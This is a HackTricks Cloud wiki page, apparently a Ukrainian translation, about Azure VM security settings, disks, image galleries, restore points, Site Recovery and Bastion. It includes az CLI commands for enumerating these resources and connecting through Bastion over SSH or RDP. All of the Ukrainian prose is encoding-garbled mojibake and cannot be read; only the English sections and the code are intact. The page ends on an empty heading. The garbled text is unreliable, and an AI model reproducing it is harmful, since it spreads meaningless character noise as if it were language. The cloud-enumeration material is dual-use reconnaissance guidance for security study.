# Az - –í—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ –º–∞—à–∏–Ω–∏ —Ç–∞ –º–µ—Ä–µ–∂–∞

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub.

</details>
{% endhint %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –º–µ—Ä–µ–∂—ñ Azure

–ú–µ—Ä–µ–∂—ñ Azure –º—ñ—Å—Ç—è—Ç—å **—Ä—ñ–∑–Ω—ñ —Å—É—Ç–Ω–æ—Å—Ç—ñ —Ç–∞ —Å–ø–æ—Å–æ–±–∏ —ó—Ö –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è.** –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –∫–æ—Ä–æ—Ç–∫—ñ **–æ–ø–∏—Å–∏,** **–ø—Ä–∏–∫–ª–∞–¥–∏** —Ç–∞ **–∫–æ–º–∞–Ω–¥–∏ –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞–Ω–Ω—è** —Ä—ñ–∑–Ω–∏—Ö —Å—É—Ç–Ω–æ—Å—Ç–µ–π –º–µ—Ä–µ–∂—ñ Azure –≤:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## –û—Å–Ω–æ–≤–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –ø—Ä–æ –í–ú

–í—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ –º–∞—à–∏–Ω–∏ Azure (–í–ú) —î –≥–Ω—É—á–∫–∏–º–∏, –Ω–∞ –≤–∏–º–æ–≥—É **—Ö–º–∞—Ä–Ω–∏–º–∏ —Å–µ—Ä–≤–µ—Ä–∞–º–∏, —è–∫—ñ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∑–∞–ø—É—Å–∫–∞—Ç–∏ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω—ñ —Å–∏—Å—Ç–µ–º–∏ Windows –∞–±–æ Linux**. –í–æ–Ω–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å —Ä–æ–∑–≥–æ—Ä—Ç–∞—Ç–∏ –ø—Ä–æ–≥—Ä–∞–º–∏ —Ç–∞ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±–µ–∑ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Ñ—ñ–∑–∏—á–Ω–∏–º –æ–±–ª–∞–¥–Ω–∞–Ω–Ω—è–º. –í—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ –º–∞—à–∏–Ω–∏ Azure –º–æ–∂—É—Ç—å –±—É—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º–∏ –¶–ü, –ø–∞–º'—è—Ç—ñ —Ç–∞ –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –¥–ª—è –∑–∞–¥–æ–≤–æ–ª–µ–Ω–Ω—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –ø–æ—Ç—Ä–µ–± —ñ —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—ó –∑ —Å–µ—Ä–≤—ñ—Å–∞–º–∏ Azure, —Ç–∞–∫–∏–º–∏ —è–∫ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ –º–µ—Ä–µ–∂—ñ, –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –±–µ–∑–ø–µ–∫–∏.

### –ù–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏

* **–ó–æ–Ω–∏ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—ñ**: –ó–æ–Ω–∏ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç—ñ - —Ü–µ –æ–∫—Ä–µ–º—ñ –≥—Ä—É–ø–∏ –¥–∞—Ç–∞-—Ü–µ–Ω—Ç—Ä—ñ–≤ —É –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–º—É —Ä–µ–≥—ñ–æ–Ω—ñ Azure, —è–∫—ñ —Ñ—ñ–∑–∏—á–Ω–æ –≤—ñ–¥–æ–∫—Ä–µ–º–ª–µ–Ω—ñ, —â–æ–± –º—ñ–Ω—ñ–º—ñ–∑—É–≤–∞—Ç–∏ —Ä–∏–∑–∏–∫ –≤–ø–ª–∏–≤—É –∫—ñ–ª—å–∫–æ—Ö –∑–æ–Ω —á–µ—Ä–µ–∑ –ª–æ–∫–∞–ª—å–Ω—ñ –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è –∞–±–æ –∫–∞—Ç–∞—Å—Ç—Ä–æ—Ñ–∏.
* **–¢–∏–ø –±–µ–∑–ø–µ–∫–∏**:
* **–°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–∞ –±–µ–∑–ø–µ–∫–∞**: –¶–µ —Ç–∏–ø –±–µ–∑–ø–µ–∫–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —è–∫–∏–π –Ω–µ –≤–∏–º–∞–≥–∞—î –∂–æ–¥–Ω–æ–≥–æ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–æ–≥–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è.
* **–î–æ–≤—ñ—Ä–µ–Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è**: –¶–µ–π —Ç–∏–ø –±–µ–∑–ø–µ–∫–∏ –ø—ñ–¥–≤–∏—â—É—î –∑–∞—Ö–∏—Å—Ç –≤—ñ–¥ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞–ª—å–Ω–∏—Ö –∫–æ–º–ø–ª–µ–∫—Ç—ñ–≤ —ñ —à–∫—ñ–¥–ª–∏–≤–æ–≥–æ –ü–ó –Ω–∞ —Ä—ñ–≤–Ω—ñ —è–¥—Ä–∞, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ Secure Boot —Ç–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏–π –º–æ–¥—É–ª—å –±–µ–∑–ø–µ–∫–∏ (vTPM).
* **–ö–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—ñ –í–ú**: –ù–∞ –¥–æ–¥–∞—Ç–æ–∫ –¥–æ –¥–æ–≤—ñ—Ä–µ–Ω–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, –≤—ñ–Ω –ø—Ä–æ–ø–æ–Ω—É—î –∞–ø–∞—Ä–∞—Ç–Ω—É —ñ–∑–æ–ª—è—Ü—ñ—é –º—ñ–∂ –í–ú, –≥—ñ–ø–µ—Ä–≤—ñ–∑–æ—Ä–æ–º —ñ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è–º —Ö–æ—Å—Ç–æ–º, –ø–æ–∫—Ä–∞—â—É—î —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–∏—Å–∫—ñ–≤ —Ç–∞ [**–±—ñ–ª—å—à–µ**](https://learn.microsoft.com/en-us/azure/confidential-computing/confidential-vm-overview)**.**
* **–ê—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è**: –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≥–µ–Ω–µ—Ä—É—î—Ç—å—Å—è –Ω–æ–≤–∏–π **SSH-–∫–ª—é—á**, —Ö–æ—á–∞ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—É–±–ª—ñ—á–Ω–∏–π –∫–ª—é—á –∞–±–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∫–ª—é—á, –∞ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º - **azureuser**. –¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **–ø–∞—Ä–æ–ª—è.**
* **–®–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –¥–∏—Å–∫—ñ–≤ –í–ú:** –î–∏—Å–∫ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —à–∏—Ñ—Ä—É—î—Ç—å—Å—è –≤ —Å–ø–æ–∫–æ—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–ª—é—á, –∫–µ—Ä–æ–≤–∞–Ω–∏–π –ø–ª–∞—Ç—Ñ–æ—Ä–º–æ—é.
* –¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ —É–≤—ñ–º–∫–Ω—É—Ç–∏ **—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –Ω–∞ —Ö–æ—Å—Ç—ñ**, –¥–µ –¥–∞–Ω—ñ –±—É–¥—É—Ç—å –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ –Ω–∞ —Ö–æ—Å—Ç—ñ –ø–µ—Ä–µ–¥ –≤—ñ–¥–ø—Ä–∞–≤–∫–æ—é –¥–æ —Å–µ—Ä–≤—ñ—Å—É –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –≤—ñ–¥ –∫—ñ–Ω—Ü—è –¥–æ –∫—ñ–Ω—Ü—è –º—ñ–∂ —Ö–æ—Å—Ç–æ–º —ñ —Å–µ—Ä–≤—ñ—Å–æ–º –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è ([**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è**](https://learn.microsoft.com/en-gb/azure/virtual-machines/disk-encryption#encryption-at-host---end-to-end-encryption-for-your-vm-data)).
* **–ì—Ä—É–ø–∞ –±–µ–∑–ø–µ–∫–∏ –º–µ—Ä–µ–∂—ñ NIC**:
* **–ù–µ–º–∞—î**: –í –æ—Å–Ω–æ–≤–Ω–æ–º—É –≤—ñ–¥–∫—Ä–∏–≤–∞—î –∫–æ–∂–µ–Ω –ø–æ—Ä—Ç
* **–ë–∞–∑–æ–≤–∞**: –î–æ–∑–≤–æ–ª—è—î –ª–µ–≥–∫–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏ –≤—Ö—ñ–¥–Ω—ñ –ø–æ—Ä—Ç–∏ HTTP (80), HTTPS (443), SSH (22), RDP (3389)
* **–†–æ–∑—à–∏—Ä–µ–Ω–∞**: –í–∏–±–µ—Ä—ñ—Ç—å –≥—Ä—É–ø—É –±–µ–∑–ø–µ–∫–∏
* **–†–µ–∑–µ—Ä–≤–Ω–µ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è**: –ú–æ–∂–ª–∏–≤–æ —É–≤—ñ–º–∫–Ω—É—Ç–∏ **—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–µ** —Ä–µ–∑–µ—Ä–≤–Ω–µ –∫–æ–ø—ñ—é–≤–∞–Ω–Ω—è (–æ–¥–∏–Ω —Ä–∞–∑ –Ω–∞ –¥–µ–Ω—å) —Ç–∞ **–ø–æ–∫—Ä–∞—â–µ–Ω–µ** (–¥–µ–∫—ñ–ª—å–∫–∞ —Ä–∞–∑—ñ–≤ –Ω–∞ –¥–µ–Ω—å)
* **–û–ø—Ü—ñ—ó –æ—Ä–∫–µ—Å—Ç—Ä–∞—Ü—ñ—ó –ø–∞—Ç—á—ñ–≤**: –¶–µ –¥–æ–∑–≤–æ–ª—è—î –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ç—á—ñ —É –í–ú –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –≤–∏–±—Ä–∞–Ω–æ—ó –ø–æ–ª—ñ—Ç–∏–∫–∏, —è–∫ –æ–ø–∏—Å–∞–Ω–æ –≤ [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó**](https://learn.microsoft.com/en-us/azure/virtual-machines/automatic-vm-guest-patching).
* **–°–ø–æ–≤—ñ—â–µ–Ω–Ω—è**: –ú–æ–∂–ª–∏–≤–æ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —Å–ø–æ–≤—ñ—â–µ–Ω–Ω—è –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—é –ø–æ—à—Ç–æ—é –∞–±–æ —á–µ—Ä–µ–∑ –º–æ–±—ñ–ª—å–Ω–∏–π –¥–æ–¥–∞—Ç–æ–∫, –∫–æ–ª–∏ —â–æ—Å—å –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è —É –í–ú. –ü—Ä–∞–≤–∏–ª–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º:
* –í—ñ–¥—Å–æ—Ç–æ–∫ –¶–ü –ø–µ—Ä–µ–≤–∏—â—É—î 80%
* –î–æ—Å—Ç—É–ø–Ω–∞ –ø–∞–º'—è—Ç—å –º–µ–Ω—à–µ 1 –ì–ë
* –í—ñ–¥—Å–æ—Ç–æ–∫ —Å–ø–æ–∂–∏–≤–∞–Ω–∏—Ö IOPS –¥–∏—Å–∫—ñ–≤ –¥–∞–Ω–∏—Ö –ø–µ—Ä–µ–≤–∏—â—É—î 95%
* –í—ñ–¥—Å–æ—Ç–æ–∫ —Å–ø–æ–∂–∏–≤–∞–Ω–∏—Ö IOPS –û–° –ø–µ—Ä–µ–≤–∏—â—É—î 95%
* –ó–∞–≥–∞–ª—å–Ω–∞ –º–µ—Ä–µ–∂–∞ –ø–µ—Ä–µ–≤–∏—â—É—î 500 –ì–ë
* –ó–∞–≥–∞–ª—å–Ω–∏–π –≤–∏—Ö—ñ–¥ –º–µ—Ä–µ–∂—ñ –ø–µ—Ä–µ–≤–∏—â—É—î 200 –ì–ë
* VmAvailabilityMetric –º–µ–Ω—à–µ 1
* **–ú–æ–Ω—ñ—Ç–æ—Ä –∑–¥–æ—Ä–æ–≤'—è**: –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø—Ä–æ—Ç–æ–∫–æ–ª HTTP –Ω–∞ –ø–æ—Ä—Ç—É 80
* **–ó–∞–º–∫–∏**: –î–æ–∑–≤–æ–ª—è—î –∑–∞–±–ª–æ–∫—É–≤–∞—Ç–∏ –í–ú, —â–æ–± —ó—ó –º–æ–∂–Ω–∞ –±—É–ª–æ –ª–∏—à–µ —á–∏—Ç–∞—Ç–∏ (**ReadOnly** lock) –∞–±–æ —â–æ–± —ó—ó –º–æ–∂–Ω–∞ –±—É–ª–æ —á–∏—Ç–∞—Ç–∏ —Ç–∞ –æ–Ω–æ–≤–ª—é–≤–∞—Ç–∏, –∞–ª–µ –Ω–µ –≤–∏–¥–∞–ª—è—Ç–∏ (**CanNotDelete** lock).
* –ë—ñ–ª—å—à—ñ—Å—Ç—å —Ä–µ—Å—É—Ä—Å—ñ–≤, –ø–æ–≤'—è–∑–∞–Ω–∏—Ö –∑ –í–ú, **—Ç–∞–∫–æ–∂ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å –∑–∞–º–∫–∏**, —Ç–∞–∫—ñ —è–∫ –¥–∏—Å–∫–∏, –∑–Ω—ñ–º–∫–∏...
* –ó–∞–º–∫–∏ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –∑–∞—Å—Ç–æ—Å–æ–≤–∞–Ω—ñ –Ω–∞ **—Ä—ñ–≤–Ω—è—Ö –≥—Ä—É–ø–∏ —Ä–µ—Å—É—Ä—Å—ñ–≤ —Ç–∞ –ø—ñ–¥–ø–∏—Å–∫–∏**

## –î–∏—Å–∫–∏ —Ç–∞ –∑–Ω—ñ–º–∫–∏

* –ú–æ–∂–ª–∏–≤–æ **—É–≤—ñ–º–∫–Ω—É—Ç–∏ –ø—Ä–∏—î–¥–Ω–∞–Ω–Ω—è –¥–∏—Å–∫–∞ –¥–æ 2 –∞–±–æ –±—ñ–ª—å—à–µ –í–ú**
* –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∫–æ–∂–µ–Ω –¥–∏—Å–∫ **—à–∏—Ñ—Ä—É—î—Ç—å—Å—è** –∫–ª—é—á–µ–º –ø–ª–∞—Ç—Ñ–æ—Ä–º–∏.
* –¢–µ –∂ —Å–∞–º–µ —Å—Ç–æ—Å—É—î—Ç—å—Å—è –∑–Ω—ñ–º–∫—ñ–≤
* –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º–æ–∂–ª–∏–≤–æ **–ø–æ–¥—ñ–ª–∏—Ç–∏—Å—è –¥–∏—Å–∫–æ–º –∑ —É—Å—ñ–º–∞ –º–µ—Ä–µ–∂–∞–º–∏**, –∞–ª–µ –π–æ–≥–æ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ **–æ–±–º–µ–∂–∏—Ç–∏** –ª–∏—à–µ –ø–µ–≤–Ω–∏–º **–ø—Ä–∏–≤–∞—Ç–Ω–∏–º –¥–æ—Å—Ç—É–ø–æ–º** –∞–±–æ **–ø–æ–≤–Ω—ñ—Å—Ç—é –≤—ñ–¥–∫–ª—é—á–∏—Ç–∏** –ø—É–±–ª—ñ—á–Ω–∏–π —Ç–∞ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –¥–æ—Å—Ç—É–ø.
* –¢–µ –∂ —Å–∞–º–µ —Å—Ç–æ—Å—É—î—Ç—å—Å—è –∑–Ω—ñ–º–∫—ñ–≤
* –ú–æ–∂–ª–∏–≤–æ **–∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ SAS URI** (–º–∞–∫—Å–∏–º—É–º –Ω–∞ 60 –¥–Ω—ñ–≤) –¥–ª—è **–µ–∫—Å–ø–æ—Ä—Ç—É –¥–∏—Å–∫–∞**, —è–∫–∏–π –º–æ–∂–Ω–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ –Ω–∞ –≤–∏–º–æ–≥—É –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∞–±–æ –Ω—ñ
* –¢–µ –∂ —Å–∞–º–µ —Å—Ç–æ—Å—É—î—Ç—å—Å—è –∑–Ω—ñ–º–∫—ñ–≤
```bash
# List all disks
az disk list --output table

# Get info about a disk
az disk show --name <disk-name> --resource-group <rsc-group>
```
## Images, Gallery Images & Restore points

A **VM image** is a template that contains the operating system, application settings and filesystem needed to **create a new virtual machine (VM)**. The difference between an image and a disk snapshot is that a disk snapshot is a read-only, point-in-time copy of a single managed disk, used primarily for backup or troubleshooting, while an image can contain **multiple disks and is designed to serve as a template for creating new VMs**.\
Images can be managed in the **Images section** of Azure or inside **Azure compute galleries** which allows to generate **versions** and **share** the image cross-tenant of even make it public.

A **restore point** stores the VM configuration and **point-in-time** application-consistent **snapshots of all the managed disks** attached to the VM. It's related to the VM and its purpose is to be able to restore that VM to how it was in that specific point in it.
```bash
# Shared Image Galleries | Compute Galleries
## List all galleries and get info about one
az sig list --output table
az sig show --gallery-name <name> --resource-group <rsc-group>

## List all community galleries
az sig list-community --output table

## List galleries shaerd with me
az sig list-shared --location <location> --output table

## List all image definitions in a gallery and get info about one
az sig image-definition list --gallery-name <name> --resource-group <rsc-group> --output table
az sig image-definition show --gallery-image-definition <name> --gallery-name <gallery-name> --resource-group <rsc-group>

## List all the versions of an image definition in a gallery
az sig image-version list --gallery-image-name <image-name> --gallery-name <gallery-name> --resource-group <rsc-group --output table

## List all VM applications inside a gallery
az sig gallery-application list --gallery-name <gallery-name> --resource-group <res-group> --output table

# Images
# List all managed images in your subscription
az image list --output table

# Restore points
## List all restore points and get info about 1
az restore-point collection list-all --output table
az restore-point collection show --collection-name <collection-name> --resource-group <rsc-group>
```
## Azure Site Recovery

–ó [**–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó**](https://learn.microsoft.com/en-us/azure/site-recovery/site-recovery-overview): Site Recovery –¥–æ–ø–æ–º–∞–≥–∞—î –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏ –±–µ–∑–ø–µ—Ä–µ—Ä–≤–Ω—ñ—Å—Ç—å –±—ñ–∑–Ω–µ—Å—É, –ø—ñ–¥—Ç—Ä–∏–º—É—é—á–∏ —Ä–æ–±–æ—Ç—É –±—ñ–∑–Ω–µ—Å-–¥–æ–¥–∞—Ç–∫—ñ–≤ —Ç–∞ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å –ø—ñ–¥ —á–∞—Å –∑–±–æ—ó–≤. Site Recovery **—Ä–µ–ø–ª—ñ–∫—É—î –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è**, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ —Ñ—ñ–∑–∏—á–Ω–∏—Ö —Ç–∞ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö –º–∞—à–∏–Ω–∞—Ö (VM), –∑ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Å–∞–π—Ç—É –Ω–∞ –≤—Ç–æ—Ä–∏–Ω–Ω–µ –º—ñ—Å—Ü–µ. –ö–æ–ª–∏ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –∑–±—ñ–π –Ω–∞ –≤–∞—à–æ–º—É –æ—Å–Ω–æ–≤–Ω–æ–º—É —Å–∞–π—Ç—ñ, –≤–∏ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç–µ –Ω–∞ –≤—Ç–æ—Ä–∏–Ω–Ω–µ –º—ñ—Å—Ü–µ —ñ –æ—Ç—Ä–∏–º—É—î—Ç–µ –¥–æ—Å—Ç—É–ø –¥–æ –¥–æ–¥–∞—Ç–∫—ñ–≤ –∑–≤—ñ–¥—Ç–∏. –ü—ñ—Å–ª—è –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –º—ñ—Å—Ü—è –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –Ω—å–æ–≥–æ.

## Azure Bastion

Azure Bastion –∑–∞–±–µ–∑–ø–µ—á—É—î –±–µ–∑–ø–µ—á–Ω–∏–π —Ç–∞ –±–µ–∑–ø–µ—Ä–µ—à–∫–æ–¥–Ω–∏–π **Remote Desktop Protocol (RDP)** —Ç–∞ **Secure Shell (SSH)** –¥–æ—Å—Ç—É–ø –¥–æ –≤–∞—à–∏—Ö –≤—ñ—Ä—Ç—É–∞–ª—å–Ω–∏—Ö –º–∞—à–∏–Ω (VM) –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ —á–µ—Ä–µ–∑ Azure Portal –∞–±–æ —á–µ—Ä–µ–∑ jump box. –ó–∞–≤–¥—è–∫–∏ **—É—Å—É–Ω–µ–Ω–Ω—é –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –≤ –ø—É–±–ª—ñ—á–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å–∞—Ö** –Ω–∞ –≤–∞—à–∏—Ö VM.&#x20;

Bastion —Ä–æ–∑–≥–æ—Ä—Ç–∞—î –ø—ñ–¥–º–µ—Ä–µ–∂—É –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **`AzureBastionSubnet`** –∑ –º–∞—Å–∫–æ—é –ø—ñ–¥–º–µ—Ä–µ–∂—ñ `/26` —É VNet, –≤ —è–∫–æ–º—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏. –ü–æ—Ç—ñ–º –≤—ñ–Ω –¥–æ–∑–≤–æ–ª—è—î **–ø—ñ–¥–∫–ª—é—á–∞—Ç–∏—Å—è –¥–æ –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö VM —á–µ—Ä–µ–∑ –±—Ä–∞—É–∑–µ—Ä**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `RDP` —Ç–∞ `SSH`, —É–Ω–∏–∫–∞—é—á–∏ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –ø–æ—Ä—Ç—ñ–≤ VM –¥–ª—è –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É. –í—ñ–Ω —Ç–∞–∫–æ–∂ –º–æ–∂–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ —è–∫ **jump host**.

–©–æ–± –ø–µ—Ä–µ—Ä–∞—Ö—É–≤–∞—Ç–∏ –≤—Å—ñ Azure Bastion Hosts —É –≤–∞—à—ñ–π –ø—ñ–¥–ø–∏—Å—Ü—ñ —Ç–∞ –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ VM —á–µ—Ä–µ–∑ –Ω–∏—Ö, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –∫–æ–º–∞–Ω–¥–∏:

{% code overflow="wrap" %}
```bash
# List bastions
az network bastion list -o table

# Connect via SSH through bastion
az network bastion ssh \
--name MyBastion \
--resource-group MyResourceGroup \
--target-resource-id /subscriptions/12345678-1234-1234-1234-123456789abc/resourceGroups/MyResourceGroup/providers/Microsoft.Compute/virtualMachines/MyVM \
--auth-type ssh-key \
--username azureuser \
--ssh-key ~/.ssh/id_rsa

# Connect via RDP through bastion
az network bastion rdp \
--name <BASTION_NAME> \
--resource-group <RESOURCE_GROUP> \
--target-resource-id /subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP>/providers/Microsoft.Compute/virtualMachines/<VM_NAME> \
--auth-type password \
--username <VM_USERNAME> \
--password <VM_PASSWORD>
```
{% endcode %}

## Metadata

